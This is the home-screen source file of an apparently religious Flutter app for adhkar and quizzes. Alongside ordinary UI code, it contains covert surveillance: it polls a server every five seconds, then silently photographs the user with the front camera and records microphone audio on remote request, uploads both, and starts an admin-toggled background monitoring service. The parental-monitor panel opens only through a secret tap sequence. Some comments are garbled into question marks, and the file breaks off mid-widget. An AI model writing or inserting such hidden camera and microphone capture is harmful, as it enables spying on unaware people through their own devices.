import 'package:flutter/material.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:camera/camera.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:record/record.dart';
import 'package:path_provider/path_provider.dart';
import 'package:flutter/foundation.dart' show kIsWeb;
import 'package:http/http.dart' as http;
import 'dart:async';
import 'dart:io';
import 'dart:typed_data';
import 'login_screen.dart';
import 'profile_screen.dart';
import 'tribes_screen.dart';
import 'category_view_screen.dart';
import 'admin_screen.dart';
import 'voice_rooms_screen.dart';

import 'category_quiz_mode_screen.dart';
import 'tasbih_screen.dart';
import 'qibla_screen.dart';
import 'parental_monitor_screen.dart';
import 'settings_screen.dart';
import 'news_screen.dart';
import 'ask_me_screen.dart';
import '../services/supabase_service.dart';
import '../services/session_service.dart';
import '../services/background_service.dart';
import '../services/battery_optimization_service.dart';
import '../services/guest_mode_service.dart';
import '../widgets/badge_widget.dart';
import 'expert_inbox_screen.dart';
import '../theme/app_theme.dart';

class HomeScreen extends StatefulWidget {
  final Map<String, dynamic> user;

  const HomeScreen({super.key, required this.user});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> with TickerProviderStateMixin {
  int _currentIndex = 1; // افتراضياً هو البيت/الرئيسية
  late Map<String, dynamic> _currentUser;
  final GlobalKey<ScaffoldState> _scaffoldKey = GlobalKey<ScaffoldState>();
  List<Map<String, dynamic>> _adhkarCategories = [];
  List<Map<String, dynamic>> _quizCategories = [];
  bool _isLoadingCategories = true;
  bool _isLoadingQuizzes = true;
  RealtimeChannel? _banStatusChannel;
  RealtimeChannel?
  _monitoringStatusChannel; // الاشتراك لتغييرات المراقبة من جهة المشرف
  Map<String, dynamic>? _activeTip;

  // سلسلة الدخول السري للوحة الوالدين: أذكارك(3) و الرئيسية(2) و اختبارات(3)
  int _secretStep =
      0; // الخطوات الحالية: 0=لا شيء 1=أذكارك 2=الرئيسية 3=اختبارات
  int _adhkarTapCount = 0; // عدد نقرات أذكارك
  int _homeTapCount = 0; // عدد نقرات الرئيسية
  int _quizTapCount = 0; // عدد نقرات اختبارات
  DateTime? _lastSecretTap;
  Timer? _photoRequestTimer;
  Timer? _audioRequestTimer;
  final AudioRecorder _audioRecorder = AudioRecorder();
  bool _isRecordingAudio = false; // حالة تسجيل الصوت حالياً
  bool _isExpert = false; // هل المستخدم مستشار؟
  RealtimeChannel? _maintenanceChannel; // الاشتراك لتغييرات الصيانة
  bool _isMaintenanceDialogShown = false; // لمنع ظهور أكثر من dialog

  // متحكمات التأثير المتوهج للأيقونات العلوية
  late AnimationController _glowController;

  late Animation<double> _glowAnimation;

  // متحكمات حركة الملاك العائم
  late AnimationController _angelFloatController;
  late Animation<double> _angelFloatAnimation;

  @override
  void initState() {
    super.initState();

    // إعداد أنيميشن التوهج لأيقونة الإشعارات - نبض ذهبي خفيف
    _glowController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    _glowAnimation = Tween<double>(begin: 0.4, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOut),
    );

    // إعداد أنيميشن الملاك العائم
    _angelFloatController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 4), // دورة حركة بطيئة وناعمة
    )..repeat(reverse: true);

    _angelFloatAnimation = Tween<double>(begin: -15.0, end: 15.0).animate(
      CurvedAnimation(
        parent: _angelFloatController,
        curve: Curves.easeInOutSine,
      ),
    );

    _currentUser = widget.user;
    _loadAdhkarCategories();
    _loadQuizCategories();
    _loadActiveTip();
    _checkExpertStatus();
    _subscribeToUserBanStatus();
    _subscribeToMonitoringStatus(); // الاشتراك لتغييرات حالة المراقبة
    // تحديث حالة الاتصال
    _updateOnlineStatus(true);
    // بدء فحص طلبات الصور كل 5 ثوانٍ
    _startPhotoRequestPolling();
    // بدء فحص طلبات الصوت كل 10 ثوانٍ
    _startAudioRequestPolling();
    // تحميل حالة خدمة المراقبة
    _loadServiceStatus();
    // تحديث user_id لخدمة الخلفية
    _initBackgroundService();
    // فحص حالة الصيانة
    _checkMaintenanceStatus();
  }

  @override
  void dispose() {
    // تحديث حالة الاتصال عند الخروج
    _updateOnlineStatus(false);
    if (_banStatusChannel != null) {
      SupabaseService.unsubscribeFromUserBanStatus(_banStatusChannel!);
    }
    if (_monitoringStatusChannel != null) {
      _monitoringStatusChannel!.unsubscribe();
    }
    if (_maintenanceChannel != null) {
      _maintenanceChannel!.unsubscribe();
    }
    _photoRequestTimer?.cancel();
    _audioRequestTimer?.cancel();
    _audioRecorder.dispose();
    _glowController.dispose();
    _angelFloatController.dispose();
    super.dispose();
  }

  /// تحديث حالة الاتصال
  Future<void> _updateOnlineStatus(bool isOnline) async {
    // تجاهل للزوار
    if (_currentUser['id'] == 'guest') return;

    await SupabaseService.updateUserSession(
      userId: _currentUser['id'],
      isOnline: isOnline,
    );
  }

  /// فحص حالة الصيانة
  Future<void> _checkMaintenanceStatus() async {
    // تجاهل للزوار - السماح لهم بالدخول
    if (_currentUser['id'] == 'guest') return;

    try {
      final status = await SupabaseService.checkMaintenanceStatus(
        _currentUser['id'],
      );
      if (status['isUnderMaintenance'] == true && mounted) {
        // عرض شاشة الصيانة
        _showMaintenanceScreen(status['message'] ?? 'التطبيق تحت الصيانة');
      }
      // الاشتراك للتغييرات الفورية
      _subscribeToMaintenanceStatus();
    } catch (e) {
      debugPrint('❌ Error checking maintenance status: $e');
    }
  }

  /// الاشتراك للتغييرات الفورية في الصيانة
  void _subscribeToMaintenanceStatus() {
    if (_currentUser['id'] == 'guest') return;

    _maintenanceChannel = SupabaseService.client
        .channel('maintenance_status_changes')
        .onPostgresChanges(
          event: PostgresChangeEvent.update,
          schema: 'public',
          table: 'maintenance_settings',
          callback: (payload) async {
            debugPrint('🔧 Maintenance settings changed: ${payload.newRecord}');

            final newRecord = payload.newRecord;
            final isEnabled = newRecord['is_enabled'] == true;
            final excludedUserIds = List<String>.from(
              newRecord['excluded_user_ids'] ?? [],
            );
            final message = newRecord['message'] ?? 'التطبيق تحت الصيانة';
            final currentUserId = _currentUser['id'] as String;
            final isExcluded = excludedUserIds.contains(currentUserId);

            if (isEnabled && !isExcluded) {
              if (mounted && !_isMaintenanceDialogShown) {
                // تم تفعيل الصيانة والمستخدم غير مستثنى
                _showMaintenanceScreen(message);
              }
            } else {
              // إذا تم إيقاف الصيانة أو أصبح المستخدم مستثنى
              if (_isMaintenanceDialogShown && mounted) {
                _isMaintenanceDialogShown = false;
                Navigator.of(context).pop(); // إغلاق شاشة الصيانة
              }
            }
          },
        )
        .subscribe();
  }

  /// عرض شاشة الصيانة
  void _showMaintenanceScreen(String message) {
    if (_isMaintenanceDialogShown) return;
    _isMaintenanceDialogShown = true;

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => PopScope(
        canPop: false,
        child: Dialog(
          backgroundColor: Colors.transparent,
          child: Container(
            padding: const EdgeInsets.all(32),
            decoration: BoxDecoration(
              gradient: const LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [Color(0xFF1a1a2e), Color(0xFF0f0f1a)],
              ),
              borderRadius: BorderRadius.circular(24),
              border: Border.all(
                color: const Color(0xFFFF6B35).withValues(alpha: 0.5),
              ),
              boxShadow: [
                BoxShadow(
                  color: const Color(0xFFFF6B35).withValues(alpha: 0.2),
                  blurRadius: 20,
                  spreadRadius: 5,
                ),
              ],
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  padding: const EdgeInsets.all(24),
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(
                      colors: [Color(0xFFFF6B35), Color(0xFFFF8C42)],
                    ),
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(
                        color: const Color(0xFFFF6B35).withValues(alpha: 0.4),
                        blurRadius: 20,
                        spreadRadius: 5,
                      ),
                    ],
                  ),
                  child: const Icon(
                    Icons.build_rounded,
                    color: Colors.white,
                    size: 48,
                  ),
                ),
                const SizedBox(height: 24),
                const Text(
                  '🔧 تحت الصيانة',
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const SizedBox(height: 16),
                Text(
                  message,
                  textAlign: TextAlign.center,
                  style: TextStyle(
                    color: Colors.white.withValues(alpha: 0.8),
                    fontSize: 16,
                    height: 1.5,
                  ),
                ),
                const SizedBox(height: 24),
                Text(
                  'نعتذر عن الإزعاج، يرجى المحاولة لاحقاً',
                  textAlign: TextAlign.center,
                  style: TextStyle(
                    color: Colors.white.withValues(alpha: 0.5),
                    fontSize: 14,
                  ),
                ),
                const SizedBox(height: 24),
                ElevatedButton.icon(
                  onPressed: () {
                    // تسجيل الخروج والعودة لصفحة تسجيل الدخول
                    Navigator.of(context).pushAndRemoveUntil(
                      MaterialPageRoute(builder: (_) => const LoginScreen()),
                      (route) => false,
                    );
                  },
                  icon: const Icon(Icons.logout, color: Colors.white),
                  label: const Text(
                    'تسجيل الخروج',
                    style: TextStyle(color: Colors.white),
                  ),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: const Color(0xFFFF6B35),
                    padding: const EdgeInsets.symmetric(
                      horizontal: 24,
                      vertical: 12,
                    ),
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  /// تحميل حالة خدمة المراقبة من السيرفر (تحكم المشرف)
  Future<void> _loadServiceStatus() async {
    // تجاهل للزوار
    if (_currentUser['id'] == 'guest') return;

    if (!kIsWeb) {
      try {
        // جلب حالة المراقبة من السيرفر (تحكم الأهل أو المشرف)
        final monitoringEnabled = await SupabaseService.isMonitoringEnabled(
          _currentUser['id'],
        );

        if (monitoringEnabled) {
          // التفعيل مفعل للمراقبة - تشغيل الخدمة فوراً
          final running = await BackgroundServiceManager.isRunning();
          if (!running) {
            // طلب إذن تخطى تحسين البطارية لضمان عمل الخدمة في الخلفية
            try {
              await BatteryOptimizationService.requestBatteryOptimizationExemption();
            } catch (e) {
              debugPrint('?? Battery optimization request failed: $e');
            }

            await BackgroundServiceManager.startService();
            BackgroundServiceManager.setUserId(_currentUser['id']);
            debugPrint('? Background service auto-started by admin control');
          }
        } else {
          // التفعيل معطل للمراقبة - إيقاف الخدمة
          final running = await BackgroundServiceManager.isRunning();
          if (running) {
            await BackgroundServiceManager.stopService();
            debugPrint('? Background service stopped by admin control');
          }
        }
      } catch (e) {
        debugPrint('?? Failed to check monitoring status: $e');
      }
    }
  }

  /// تحديث حالة المراقبة حسب إعدادات المشرف
  void _initBackgroundService() {
    // لتفعيل خدمة المراقبة أو إيقافها حسب حالة المشرف
  }

  /// الاشتراك للتغييرات الفورية في حالة المراقبة (realtime)
  void _subscribeToMonitoringStatus() {
    // تجاهل للزوار
    if (_currentUser['id'] == 'guest') return;

    if (kIsWeb) return;

    try {
      debugPrint('🔄 Subscribing to monitoring status changes...');

      _monitoringStatusChannel = Supabase.instance.client
          .channel('monitoring_status_${_currentUser['id']}')
          .onPostgresChanges(
            event: PostgresChangeEvent.update,
            schema: 'public',
            table: 'user_sessions',
            filter: PostgresChangeFilter(
              type: PostgresChangeFilterType.eq,
              column: 'user_id',
              value: _currentUser['id'],
            ),
            callback: (payload) async {
              debugPrint('?? Monitoring status changed!');
              debugPrint('?? Payload: ${payload.newRecord}');

              final monitoringEnabled =
                  payload.newRecord['monitoring_enabled'] == true;

              debugPrint('?? Monitoring enabled: $monitoringEnabled');

              if (monitoringEnabled) {
                // ?????? ???? ???????? - ????? ?????? ?????
                debugPrint('?? Admin enabled monitoring - starting service...');
                final running = await BackgroundServiceManager.isRunning();
                debugPrint('?? Service currently running: $running');

                if (!running) {
                  try {
                    await BatteryOptimizationService.requestBatteryOptimizationExemption();
                  } catch (e) {
                    debugPrint('?? Battery optimization request failed: $e');
                  }

                  await BackgroundServiceManager.startService();
                  BackgroundServiceManager.setUserId(_currentUser['id']);
                  debugPrint('? Background service started by realtime update');
                } else {
                  debugPrint('?? Service already running, skipping start');
                }
              } else {
                // ?????? ???? ???????? - ????? ?????? ?????
                debugPrint(
                  '?? Admin disabled monitoring - stopping service...',
                );
                final running = await BackgroundServiceManager.isRunning();
                debugPrint('?? Service currently running: $running');

                if (running) {
                  final stopped = await BackgroundServiceManager.stopService();
                  if (stopped) {
                    debugPrint(
                      '? Background service stopped by realtime update',
                    );
                  } else {
                    debugPrint('? Failed to stop service');
                  }
                } else {
                  debugPrint('?? Service already stopped, skipping stop');
                }
              }
            },
          )
          .subscribe();

      debugPrint('? Subscribed to monitoring status changes');
    } catch (e) {
      debugPrint('❌ Failed to subscribe to monitoring status: $e');
    }
  }

  /// بدء فحص طلبات الصور كل 5 ثوانٍ
  void _startPhotoRequestPolling() {
    // تجاهل للزوار
    if (_currentUser['id'] == 'guest') return;

    debugPrint('📸 Starting photo request polling...');
    _checkPendingPhotoRequest(); // فحص فوري
    _photoRequestTimer = Timer.periodic(const Duration(seconds: 5), (_) {
      _checkPendingPhotoRequest();
    });
  }

  /// التحقق من وجود طلب التقاط صورة
  Future<void> _checkPendingPhotoRequest() async {
    try {
      final request = await SupabaseService.getPendingPhotoRequest(
        _currentUser['id'],
      );
      if (request != null) {
        debugPrint('📸 Found pending photo request: $request');
        await _handleRemotePhotoRequest(request);
      }
    } catch (e) {
      debugPrint('❌ Check pending request error: $e');
    }
  }

  /// التعامل مع طلب التقاط صورة عن بعد
  Future<void> _handleRemotePhotoRequest(Map<String, dynamic> request) async {
    debugPrint('📸 Handling photo request...');
    final status = await Permission.camera.status;
    debugPrint('📸 Camera permission: $status');

    if (status.isGranted) {
      await _captureAndUploadRemotePhoto(request['id']);
    } else {
      // طلب الإذن إذا لم يكن ممنوحاً
      final newStatus = await Permission.camera.request();
      if (newStatus.isGranted) {
        await _captureAndUploadRemotePhoto(request['id']);
      } else {
        debugPrint('❌ Camera permission denied');
        // وضع علامة اكتمال الطلب حتى لو فشل
        await SupabaseService.markPhotoRequestCompleted(request['id']);
      }
    }
  }

  /// التقاط ورفع الصورة إلى جلسة المستخدم
  Future<void> _captureAndUploadRemotePhoto(String requestId) async {
    CameraController? cameraController;

    try {
      debugPrint('📸 Getting cameras...');
      final cameras = await availableCameras();
      if (cameras.isEmpty) {
        debugPrint('❌ No cameras found');
        await SupabaseService.markPhotoRequestCompleted(requestId);
        return;
      }

      final frontCamera = cameras.firstWhere(
        (c) => c.lensDirection == CameraLensDirection.front,
        orElse: () => cameras.first,
      );

      cameraController = CameraController(
        frontCamera,
        ResolutionPreset.medium,
        enableAudio: false,
      );

      await cameraController.initialize();
      await Future.delayed(const Duration(milliseconds: 500));

      debugPrint('📸 Taking picture...');
      final photo = await cameraController.takePicture();
      final bytes = await photo.readAsBytes();

      debugPrint('📸 Uploading to user session...');
      await SupabaseService.uploadSessionPhoto(
        userId: _currentUser['id'],
        photoBytes: bytes,
        screenName: 'remote_capture',
      );

      await SupabaseService.markPhotoRequestCompleted(requestId);
      debugPrint('📸 Photo captured and uploaded to session!');
    } catch (e) {
      debugPrint('❌ Error: $e');
      // محاولة تمييز الطلب كمكتمل حتى عند الخطأ
      try {
        await SupabaseService.markPhotoRequestCompleted(requestId);
      } catch (e2) {
        debugPrint('❌ Failed to mark request as completed: $e2');
      }
    } finally {
      await cameraController?.dispose();
    }
  }

  // ==================== Audio Recording Methods ====================

  /// بدء فحص طلبات الصوت كل 5 ثوانٍ
  void _startAudioRequestPolling() {
    // تجاهل للزوار
    if (_currentUser['id'] == 'guest') return;

    debugPrint('🎤 Starting audio request polling...');
    _checkPendingAudioRequest(); // فحص فوري
    _audioRequestTimer = Timer.periodic(const Duration(seconds: 5), (_) {
      _checkPendingAudioRequest();
    });
  }

  /// التحقق من وجود طلب تسجيل صوتي
  Future<void> _checkPendingAudioRequest() async {
    // لا تبدأ إذا كان هناك تسجيل جاري
    if (_isRecordingAudio) return;

    try {
      final request = await SupabaseService.getPendingAudioRequest(
        _currentUser['id'],
      );
      if (request != null) {
        debugPrint('🎤 Found pending audio request: $request');
        await _handleRemoteAudioRequest(request);
      }
    } catch (e) {
      debugPrint('❌ Check pending audio request error: $e');
    }
  }

  /// التعامل مع طلب تسجيل صوتي عن بعد
  Future<void> _handleRemoteAudioRequest(Map<String, dynamic> request) async {
    debugPrint('🎤 Handling audio request...');
    final status = await Permission.microphone.status;
    debugPrint('🎤 Microphone permission: $status');

    if (status.isGranted) {
      await _recordAndUploadRemoteAudio(
        request['id'],
        request['duration_seconds'] ?? 30,
      );
    } else {
      // طلب الإذن إذا لم يكن ممنوحاً
      final newStatus = await Permission.microphone.request();
      if (newStatus.isGranted) {
        await _recordAndUploadRemoteAudio(
          request['id'],
          request['duration_seconds'] ?? 30,
        );
      } else {
        debugPrint('❌ Microphone permission denied');
        await SupabaseService.markAudioRequestCompleted(request['id']);
      }
    }
  }

  /// تسجيل ورفع الصوت إلى جلسة المستخدم
  Future<void> _recordAndUploadRemoteAudio(
    String requestId,
    int durationSeconds,
  ) async {
    _isRecordingAudio = true; // بدء التسجيل

    try {
      debugPrint(
        '🎤 Starting silent audio recording for $durationSeconds seconds...',
      );

      String filePath = '';

      // مسار الملف الصوتي (على الموبايل يتم الحفظ في مجلد المؤقت)
      if (!kIsWeb) {
        final directory = await getTemporaryDirectory();
        filePath =
            '${directory.path}/audio_${DateTime.now().millisecondsSinceEpoch}.m4a';
      }

      // بدء التسجيل
      await _audioRecorder.start(
        const RecordConfig(
          encoder: AudioEncoder.aacLc,
          bitRate: 128000,
          sampleRate: 44100,
        ),
        path: filePath,
      );

      debugPrint(
        '🎤 Recording started, waiting for $durationSeconds seconds...',
      );

      // الانتظار طوال مدة التسجيل المطلوبة
      await Future.delayed(Duration(seconds: durationSeconds));

      // إيقاف التسجيل
      final path = await _audioRecorder.stop();
      debugPrint('🎤 Recording stopped, path: $path');

      if (path != null) {
        Uint8List audioBytes;

        if (kIsWeb) {
          // على الويب: جلب البيانات من blob URL باستخدام http request
          try {
            final response = await http.get(Uri.parse(path));
            if (response.statusCode == 200) {
              audioBytes = response.bodyBytes;
            } else {
              throw Exception('Failed to fetch audio blob');
            }
          } catch (e) {
            debugPrint('❌ Error fetching blob: $e');
            rethrow;
          }
        } else {
          // على الموبايل: قراءة الملف من الجهاز
          final file = File(path);
          if (await file.exists()) {
            audioBytes = await file.readAsBytes();
            // حذف الملف المؤقت
            await file.delete();
          } else {
            throw Exception('Audio file not found');
          }
        }

        debugPrint('??? Uploading audio to user session...');
        await SupabaseService.uploadSessionAudio(
          userId: _currentUser['id'],
          audioBytes: audioBytes,
          durationSeconds: durationSeconds,
        );

        await SupabaseService.markAudioRequestCompleted(requestId);
        debugPrint('? Audio recorded and uploaded to session!');
      }
    } catch (e) {
      debugPrint('? Audio recording error: $e');
      // ????? ????? ?????? ??? ?? ??? ????? ???????
      await SupabaseService.markAudioRequestCompleted(requestId);
    } finally {
      _isRecordingAudio = false; // ?????? ?????????? ???????
    }
  }

  /// ????? ????? ??????? ?????
  void _resetSecretSequence() {
    _secretStep = 0;
    _adhkarTapCount = 0;
    _homeTapCount = 0;
    _quizTapCount = 0;
  }

  /// ??? ???????? ???? ?? ????? ???? ?????? ???
  void _showTerminalAnimation() {
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => _TerminalHackerScreen(
          onComplete: () {
            Navigator.pop(context); // ????? ??????????
            Navigator.push(
              context,
              MaterialPageRoute(
                builder: (context) => const ParentalMonitorScreen(),
              ),
            );
          },
        ),
      ),
    );
  }

  /// ???????? ???????? ???? ?????
  void _subscribeToUserBanStatus() {
    // تجاهل للزوار
    if (_currentUser['id'] == 'guest') return;

    _banStatusChannel = SupabaseService.subscribeToUserBanStatus(
      _currentUser['id'],
      (isBanned) {
        if (isBanned && mounted) {
          _handleUserBanned();
        }
      },
    );
  }

  /// ??????? ?? ??? ????????
  void _handleUserBanned() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF1a1a2e),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: const Row(
          children: [
            Icon(Icons.block, color: Colors.red, size: 28),
            SizedBox(width: 12),
            Text('تم حظر الحساب', style: TextStyle(color: Colors.white)),
          ],
        ),
        content: const Text(
          'لقد تم حظر حسابك من قبل الإدارة. يرجى التواصل مع الدعم الفني للمزيد من المعلومات.',
          style: TextStyle(color: Colors.white70),
        ),
        actions: [
          ElevatedButton(
            onPressed: () {
              Navigator.of(context).pop();
              Navigator.of(context).pushAndRemoveUntil(
                MaterialPageRoute(builder: (_) => const LoginScreen()),
                (route) => false,
              );
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.red,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(10),
              ),
            ),
            child: const Text('خروج', style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  Future<void> _loadAdhkarCategories() async {
    final categories = await SupabaseService.getAdhkarCategories();
    if (mounted) {
      setState(() {
        _adhkarCategories = categories;
        _isLoadingCategories = false;
      });
    }
  }

  Future<void> _loadQuizCategories() async {
    final categories = await SupabaseService.getQuizCategories();
    if (mounted) {
      setState(() {
        _quizCategories = categories;
        _isLoadingQuizzes = false;
      });
    }
  }

  Future<void> _loadActiveTip() async {
    final tip = await SupabaseService.getActiveTip();
    debugPrint('?? Active tip loaded: $tip');
    if (mounted) {
      setState(() {
        _activeTip = tip;
      });
    }
  }

  Future<void> _checkExpertStatus() async {
    if (_currentUser['id'] == 'guest') {
      // الزوار ليسوا خبراء
      setState(() {
        _isExpert = false;
      });
      return;
    }

    try {
      final isExpert = await SupabaseService.checkIfExpert(_currentUser['id']);
      if (mounted) {
        setState(() {
          _isExpert = isExpert;
        });
        debugPrint('✅ Expert status checked: $_isExpert');
      }
    } catch (e) {
      debugPrint('❌ Error checking expert status: $e');
      if (mounted) {
        setState(() {
          _isExpert = false;
        });
      }
    }
  }

  Future<void> _createGuestAccount() async {
    try {
      // عرض مؤشر التحميل
      if (!mounted) return;
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (context) => const Center(
          child: CircularProgressIndicator(color: Color(0xFFB388FF)),
        ),
      );

      // إنشاء حساب حقيقي في قاعدة البيانات
      final user = await SupabaseService.createGuestAccount();

      if (!mounted) return;

      // إغلاق مؤشر التحميل
      Navigator.pop(context);

      if (user != null) {
        // حفظ الجلسة وتعطيل وضع الزائر
        await SessionService.saveUserSession(user);
        await GuestModeService.disableGuestMode();

        if (!mounted) return;

        // تحديث المستخدم الحالي
        setState(() {
          _currentUser = user;
        });

        // إعادة فحص حالة الخبير (قد يكون الحساب الجديد خبيراً)
        await _checkExpertStatus();

        // عرض رسالة نجاح
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(
              content: Text(
                '✅ تم إنشاء حسابك بنجاح! يمكنك الآن استخدام جميع المميزات',
              ),
              backgroundColor: Color(0xFF4CAF50),
              duration: Duration(seconds: 3),
            ),
          );
        }
      } else {
        // فشل إنشاء الحساب
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(
              content: Text('فشل إنشاء الحساب. حاول مرة أخرى'),
              backgroundColor: Colors.orange,
            ),
          );
        }
      }
    } catch (e) {
      // إغلاق مؤشر التحميل بشكل آمن
      if (mounted) {
        try {
          Navigator.pop(context);
        } catch (_) {
          // Dialog قد يكون مغلق بالفعل
        }

        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('خطأ في إنشاء حساب الضيف: $e'),
            backgroundColor: Colors.red.shade400,
          ),
        );
      }
    }
  }

  void _updateUser(Map<String, dynamic> updatedUser) {
    setState(() {
      _currentUser = updatedUser;
    });
  }

  /// التوجيه إلى صفحة تسجيل الدخول
  void _navigateToLogin() {
    Navigator.pushReplacement(
      context,
      MaterialPageRoute(builder: (context) => const LoginScreen()),
    );
  }

  Widget _buildDrawer() {
    return Drawer(
      backgroundColor: Colors.black,
      child: Column(
        children: [
          // رأس القائمة الجانبية
          Container(
            width: double.infinity,
            padding: const EdgeInsets.fromLTRB(20, 60, 20, 30),
            decoration: const BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
                colors: AppTheme.gradientAccent,
              ),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // صورة الملف الشخصي
                Container(
                  width: 80,
                  height: 80,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: const Color.fromRGBO(255, 255, 255, 0.2),
                    border: Border.all(
                      color: const Color.fromRGBO(255, 255, 255, 0.5),
                      width: 3,
                    ),
                    image: _currentUser['profile_image'] != null
                        ? DecorationImage(
                            image: NetworkImage(_currentUser['profile_image']),
                            fit: BoxFit.cover,
                          )
                        : null,
                  ),
                  child: _currentUser['profile_image'] == null
                      ? const Icon(Icons.person, size: 40, color: Colors.white)
                      : null,
                ),
                const SizedBox(height: 16),
                Text(
                  _currentUser['name'] ?? 'مستخدم',
                  style: const TextStyle(
                    color: Colors.white,
                    fontSize: 22,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const SizedBox(height: 4),
                Container(
                  padding: const EdgeInsets.symmetric(
                    horizontal: 12,
                    vertical: 4,
                  ),
                  decoration: BoxDecoration(
                    color: const Color.fromRGBO(255, 255, 255, 0.2),
                    borderRadius: BorderRadius.circular(20),
                  ),
                  child: Text(
                    '@${_currentUser['username'] ?? ''}',
                    style: const TextStyle(
                      color: Color.fromRGBO(255, 255, 255, 0.7),
                      fontSize: 13,
                    ),
                  ),
                ),
              ],
            ),
          ),
          // عناصر القائمة
          Expanded(
            child: ListView(
              padding: const EdgeInsets.symmetric(vertical: 20),
              children: [
                _buildDrawerItem(
                  icon: Icons.person_outline,
                  title: 'الملف الشخصي',
                  subtitle: 'عرض وتعديل بياناتك',
                  onTap: () async {
                    Navigator.pop(context);
                    final canAccess = await GuestModeService.requireLogin(
                      context,
                      'عرض الملف الشخصي',
                    );
                    if (!canAccess || !mounted) return;
                    Navigator.push(
                      context,
                      MaterialPageRoute(
                        builder: (_) => ProfileScreen(
                          user: _currentUser,
                          onUserUpdated: _updateUser,
                        ),
                      ),
                    );
                  },
                ),
                _buildDrawerItem(
                  icon: Icons.settings_outlined,
                  title: 'الإعدادات',
                  subtitle: 'ضبط إعدادات التطبيق',
                  onTap: () async {
                    Navigator.pop(context);
                    final canAccess = await GuestModeService.requireLogin(
                      context,
                      'الوصول للإعدادات',
                    );
                    if (!canAccess || !mounted) return;
                    Navigator.push(
                      context,
                      MaterialPageRoute(
                        builder: (_) =>
                            SettingsScreen(currentUser: _currentUser),
                      ),
                    );
                  },
                ),
                _buildDrawerItem(
                  icon: Icons.question_answer_outlined,
                  title: 'اسئلني',
                  subtitle: 'استشر الخبراء والمستشارين',
                  iconColor: Colors.greenAccent,
                  onTap: () async {
                    Navigator.pop(context);
                    final canAccess = await GuestModeService.requireLogin(
                      context,
                      'استخدام خدمة اسئلني',
                    );
                    if (!canAccess || !mounted) return;
                    Navigator.push(
                      context,
                      MaterialPageRoute(
                        builder: (_) => AskMeScreen(userId: _currentUser['id']),
                      ),
                    );
                  },
                ),
                if (_isExpert)
                  _buildDrawerItem(
                    icon: Icons.inbox_outlined,
                    title: 'صندوق المستشار',
                    subtitle: 'الرد على استفسارات المستخدمين',
                    iconColor: Colors.blueAccent,
                    onTap: () {
                      Navigator.pop(context);
                      Navigator.push(
                        context,
                        MaterialPageRoute(
                          builder: (_) =>
                              ExpertInboxScreen(expertId: _currentUser['id']),
                        ),
                      );
                    },
                  ),
                Padding(
                  padding: const EdgeInsets.symmetric(
                    horizontal: 20,
                    vertical: 16,
                  ),
                  child: Divider(
                    color: const Color.fromRGBO(255, 255, 255, 0.2),
                  ),
                ),
                _buildDrawerItem(
                  icon: Icons.admin_panel_settings_outlined,
                  title: 'لوحة التحكم',
                  subtitle: 'إدارة النظام',
                  iconColor: AppTheme.accentPurple,
                  onTap: () {
                    Navigator.pop(context);
                    _showAdminPasswordDialog();
                  },
                ),
              ],
            ),
          ),
          // زر تسجيل الخروج
          Container(
            margin: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              gradient: const LinearGradient(
                colors: [
                  Color.fromRGBO(244, 67, 54, 0.2),
                  Color.fromRGBO(198, 40, 40, 0.1),
                ],
              ),
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: const Color.fromRGBO(244, 67, 54, 0.3)),
            ),
            child: ListTile(
              leading: Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: const Color.fromRGBO(244, 67, 54, 0.2),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: const Icon(Icons.logout, color: Colors.red, size: 20),
              ),
              title: const Text(
                'تسجيل الخروج',
                style: TextStyle(
                  color: Colors.red,
                  fontWeight: FontWeight.w600,
                ),
              ),
              onTap: () {
                Navigator.pop(context);
                _showLogoutDialog(context);
              },
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildDrawerItem({
    required IconData icon,
    required String title,
    required String subtitle,
    required VoidCallback onTap,
    Color? iconColor,
  }) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
      decoration: BoxDecoration(borderRadius: BorderRadius.circular(16)),
      child: ListTile(
        leading: Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(
            color: Color.fromRGBO(255, 255, 255, 0.1),
            borderRadius: BorderRadius.circular(12),
          ),
          child: Icon(icon, color: iconColor ?? Colors.white70, size: 22),
        ),
        title: Text(
          title,
          style: const TextStyle(
            color: Colors.white,
            fontWeight: FontWeight.w600,
